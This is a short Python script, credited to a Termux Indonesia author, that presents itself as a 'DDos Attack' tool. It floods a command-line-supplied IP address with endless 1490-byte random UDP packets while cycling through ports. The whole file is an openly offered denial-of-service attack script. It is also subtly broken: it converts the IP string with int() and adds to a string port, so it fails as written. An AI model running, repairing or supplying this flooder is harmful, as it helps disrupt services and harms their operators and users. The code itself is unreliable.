import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet Termuxid DDos Attack")

print("""
Author   : Rio Agung Purnomo
TEAM     : Termux Indonesia
Thanks   : All Member Termux Indonesia
Tingkat  : Programmer & Developer
https://termuxid.dev
""")

ip = sys.argv[1]
port = sys.argv[2]

os.system("clear")
os.system("figlet Attack Starting")

percen = ""
for i in range(100):
  if i % 25 == 0:
    percen += "===="
  print("[" + percen +"] " + str(i) + "%")
  time.sleep(.1)
  os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (int(ip), int(port)))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1